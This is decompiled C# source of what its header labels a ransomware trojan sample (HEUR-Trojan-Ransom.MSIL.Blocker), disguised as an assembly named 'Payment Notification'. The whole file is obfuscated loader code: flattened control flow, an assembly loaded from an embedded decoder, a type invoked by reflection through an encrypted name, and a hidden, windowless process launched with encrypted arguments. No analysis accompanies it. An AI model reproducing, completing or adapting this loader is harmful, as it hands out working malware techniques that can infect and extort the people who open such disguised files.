// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Payment Notification, Version=98.0.1.8107, Culture=neutral, PublicKeyToken=null
// MVID: FA79794C-3025-C735-E6EB-7AA05AC66D58
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9edc14cb7b9c966a121bf2b954dc49826435e452a4b161242d42fda789ed45da.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class \uE008
{
  [STAThread]
  private static void Main()
  {
label_10:
    int num1 = \uE00C.\uE004(14);
    int num2 = 11;
label_2:
    while (true)
    {
      num2 ^= 23;
label_4:
      int num3 = \uE00C.\uE004(14);
      while (true)
      {
        switch ((num3 ^ 15) + 15)
        {
          case 0:
            switch (num2)
            {
              case 26:
                switch (num1 + 26)
                {
                  case 0:
                    Console.WriteLine((object) DateTime.Now);
                    num1 = -1;
                    goto label_1;
                  case 1:
                    num1 = -15;
                    goto label_1;
                  case 2:
                    \uE008.\uE004();
                    num1 = -14;
                    goto label_1;
                  case 3:
                    Console.WriteLine(Application.ExecutablePath);
                    num1 = -10;
                    goto label_1;
                  case 4:
                    num1 = -9;
                    goto label_1;
                  case 5:
                    num1 = \uE00C.\uE004(16);
                    goto label_1;
                  case 6:
                    num1 = -24;
                    goto label_1;
                  case 7:
                    \uE008.\uE005();
                    num1 = -13;
                    goto label_1;
                  case 8:
                    num1 = -11;
                    goto label_1;
                  case 9:
                    \uE008.\uE001();
                    num1 = -12;
                    goto label_1;
                  case 10:
                    goto label_12;
                  default:
                    goto label_9;
                }
              case 27:
                goto label_10;
              case 28:
label_1:
                num1 ^= 24;
                goto label_7;
              default:
                num3 = -3;
                continue;
            }
          case 1:
label_7:
            num2 = \uE013.\uE024(21);
            num3 = -4;
            continue;
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = 12;
    }
label_12:;
  }

  internal static void \uE000(ref byte[] _param0)
  {
label_10:
    int num1 = \uE013.\uE024(34);
    int num2 = 63;
label_2:
    while (true)
    {
      num2 ^= 26;
label_4:
      int num3 = \uE00F.\uE021(38);
      while (true)
      {
        switch ((num3 ^ 42) + 36)
        {
          case 0:
            switch (num2)
            {
              case 35:
                switch (num1 + 29)
                {
                  case 0:
                    Array.Reverse((Array) _param0, 0, _param0.Length);
                    num1 = -64;
                    goto label_1;
                  case 1:
                    num1 = -63;
                    goto label_1;
                  case 2:
                    goto label_11;
                  default:
                    goto label_9;
                }
              case 36:
                goto label_10;
              case 37:
label_1:
                num1 ^= 36;
                goto label_7;
              default:
                num3 = -9;
                continue;
            }
          case 1:
label_7:
            num2 = \uE013.\uE024(41);
            num3 = -12;
            continue;
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = 62;
    }
label_11:;
  }

  private static void \uE001()
  {
    try
    {
      string[] strArray = File.ReadAllLines(Environment.CurrentDirectory + \uE00B.\uE000(32321));
label_7:
      int num1 = \uE00F.\uE021(46);
      int num2 = 12;
      Task[] taskArray;
      DateTime now1;
      while (true)
      {
        switch (num2 ^ 54)
        {
          case 56:
            int index;
            \uE00A obj;
            string str;
            Task task;
            switch (num1)
            {
              case 37:
                taskArray = new Task[strArray.Length];
                num1 = 2;
                goto label_2;
              case 38:
label_9:
                num1 = \uE00F.\uE021(53);
                goto label_2;
              case 39:
                index = 0;
                num1 = 3;
                goto label_2;
              case 40:
                if (index != 0)
                {
                  num1 = 13;
                  goto label_2;
                }
                else
                  break;
              case 41:
                obj = new \uE00A(taskArray.Length, strArray);
                num1 = 5;
                goto label_2;
              case 42:
                num1 = 4;
                goto label_2;
              case 43:
                task = obj.\uE002(new CancellationToken?(), (object) str);
                num1 = 6;
                goto label_2;
              case 44:
                str = strArray[index];
                num1 = 0;
                goto label_2;
              case 45:
                taskArray[index] = task;
                num1 = 1;
                goto label_2;
              case 46:
                now1 = DateTime.Now;
                num1 = 12;
                goto label_2;
              case 47:
                ++index;
                break;
              default:
                num2 = 15;
                continue;
            }
            if ((index >= taskArray.Length ? 0 : 1) != 0)
              goto label_9;
            else
              goto label_21;
          case 57:
            goto label_7;
          case 58:
label_2:
            num1 ^= 43;
            break;
        }
        num2 = \uE00F.\uE021(46);
      }
label_21:
      Task.WaitAll(taskArray);
label_23:
      int num3 = \uE00F.\uE021(51);
      DateTime now2;
      TimeSpan timeSpan;
      double totalMilliseconds;
      while (true)
      {
        switch (num3 ^ 44)
        {
          case 43:
            num3 = 0;
            continue;
          case 44:
            num3 = 30;
            continue;
          case 45:
            now2 = DateTime.Now;
            num3 = 2;
            continue;
          case 46:
            timeSpan = now2 - now1;
            num3 = 29;
            continue;
          case 47:
            num3 = 1;
            continue;
          case 48:
            Console.WriteLine(totalMilliseconds.ToString());
            num3 = \uE00F.\uE021(53);
            continue;
          case 49:
            totalMilliseconds = timeSpan.TotalMilliseconds;
            num3 = 28;
            continue;
          case 50:
            goto label_30;
          default:
            goto label_23;
        }
      }
label_30:;
    }
    catch
    {
      \uE008.\uE003();
    }
  }

  private static System.Type[] \uE002()
  {
label_4:
    int num1 = \uE00C.\uE004(14);
    int num2 = 15;
    List<System.Type> typeList;
    while (true)
    {
      switch (num2 ^ 56)
      {
        case 53:
          goto label_4;
        case 54:
          int index;
          Assembly[] assemblies;
          Assembly[] assemblyArray;
          Assembly assembly;
          switch (num1 + 59)
          {
            case 0:
              num1 = -15;
              goto label_1;
            case 1:
              if (index != 0)
              {
                num1 = -1;
                goto label_1;
              }
              else
                break;
            case 2:
              assemblyArray = assemblies;
              num1 = -4;
              goto label_1;
            case 3:
              assemblies = AppDomain.CurrentDomain.GetAssemblies();
              num1 = -3;
              goto label_1;
            case 4:
label_12:
              assembly = assemblyArray[index];
              num1 = -6;
              goto label_1;
            case 5:
              index = 0;
              num1 = \uE00C.\uE004(16);
              goto label_1;
            case 6:
              typeList = new List<System.Type>();
              num1 = -13;
              goto label_1;
            case 7:
label_16:
              int num3 = \uE00A.\uE005(65);
              while (true)
              {
                switch ((num3 ^ 61) + 55)
                {
                  case 0:
                    num3 = -15;
                    continue;
                  case 1:
                    num3 = -10;
                    continue;
                  case 2:
                    num3 = -16;
                    continue;
                  case 3:
                    typeList.AddRange((IEnumerable<System.Type>) assembly.GetTypes());
                    num3 = \uE00A.\uE005(63);
                    continue;
                  case 4:
                    goto label_21;
                  default:
                    goto label_16;
                }
              }
label_21:
              ++index;
              break;
            default:
              num2 = 13;
              continue;
          }
          if (index < assemblyArray.Length)
            goto label_12;
          else
            goto label_23;
        case 55:
label_1:
          num1 ^= 54;
          break;
      }
      num2 = \uE00F.\uE021(46);
    }
label_23:
    return typeList.ToArray();
  }

  private static void \uE003()
  {
    System.Type[] source = \uE008.\uE002();
    // ISSUE: reference to a compiler-generated field
    Func<System.Type, bool> predicate = \uE008.\u003C\u003Ec.\u003C\u003E9__4_0;
    if ((predicate == null ? 0 : 1) == 0)
    {
      // ISSUE: reference to a compiler-generated field
      predicate = \uE008.\u003C\u003Ec.\u003C\u003E9__4_0 = (Func<System.Type, bool>) (_param1 => _param1.FullName == \uE00B.\uE000(32312));
    }
    ((IEnumerable<System.Type>) source).First<System.Type>(predicate).InvokeMember(\uE00B.\uE000(32558), BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
  }

  private static void \uE004()
  {
label_10:
    int num1 = \uE00F.\uE021(44);
    int num2 = 4;
label_2:
    Queue<int> intQueue;
    while (true)
    {
      num2 ^= 73;
label_4:
      int num3 = \uE00C.\uE005(76);
      while (true)
      {
        switch ((num3 ^ 65) + 69)
        {
          case 0:
            switch (num2)
            {
              case 75:
                switch (num1 + 73)
                {
                  case 0:
                    num1 = -3;
                    goto label_1;
                  case 1:
                    intQueue = new Queue<int>();
                    num1 = -121;
                    goto label_1;
                  case 2:
                    num1 = -125;
                    goto label_1;
                  case 3:
                    num1 = -127;
                    goto label_1;
                  case 4:
                    intQueue.Enqueue(29);
                    num1 = -6;
                    goto label_1;
                  case 5:
                    num1 = (int) sbyte.MinValue;
                    goto label_1;
                  case 6:
                    num1 = -4;
                    goto label_1;
                  case 7:
                    intQueue.Enqueue(24);
                    num1 = -1;
                    goto label_1;
                  case 8:
                    intQueue.Enqueue(4);
                    num1 = -126;
                    goto label_1;
                  case 9:
                    num1 = -122;
                    goto label_1;
                  case 10:
                    num1 = \uE00C.\uE005(72);
                    goto label_1;
                  case 11:
                    intQueue.Enqueue(34);
                    num1 = -2;
                    goto label_1;
                  case 12:
                    intQueue.Enqueue(Assembly.Load(new \uE009((TaskCompletionSource<object>) null, new CancellationToken?(), (object) null).\uE000()).FullName.GetHashCode());
                    num1 = -7;
                    goto label_1;
                  case 13:
                    intQueue.Enqueue(11);
                    num1 = -12;
                    goto label_1;
                  case 14:
                    goto label_25;
                  default:
                    goto label_9;
                }
              case 76:
                goto label_10;
              case 77:
label_1:
                num1 ^= 67;
                goto label_7;
              default:
                num3 = -3;
                continue;
            }
          case 1:
label_7:
            num2 = \uE00C.\uE004(26);
            num3 = -4;
            continue;
          case 2:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      num2 = 5;
    }
label_25:
    using (Queue<int>.Enumerator enumerator = intQueue.GetEnumerator())
    {
      while ((!enumerator.MoveNext() ? 0 : 1) != 0)
        Console.Write(enumerator.Current);
    }
  }

  private static void \uE005()
  {
label_8:
    int num1 = \uE013.\uE024(22);
    int num2 = 10;
label_2:
    while (true)
    {
      num2 ^= 65;
label_4:
      int num3 = \uE00A.\uE005(61);
      while (true)
      {
        switch (num3 ^ 72)
        {
          case 73:
            switch (num2)
            {
              case 73:
                goto label_8;
              case 74:
                switch (num1 + 67)
                {
                  case 0:
                    num1 = -3;
                    goto label_1;
                  case 1:
                    Process.Start(new ProcessStartInfo()
                    {
                      FileName = \uE00B.\uE000(32565),
                      Arguments = \uE00B.\uE000(32521),
                      WindowStyle = ProcessWindowStyle.Hidden,
                      CreateNoWindow = true
                    }).WaitForExit();
                    num1 = -1;
                    goto label_1;
                  case 2:
                    goto label_11;
                  default:
                    goto label_10;
                }
              case 75:
label_1:
                num1 ^= 66;
                goto label_7;
              default:
                num3 = 2;
                continue;
            }
          case 74:
label_7:
            num2 = \uE00C.\uE005(68);
            num3 = 3;
            continue;
          case 75:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_10:
      num2 = 8;
    }
label_11:;
  }
}
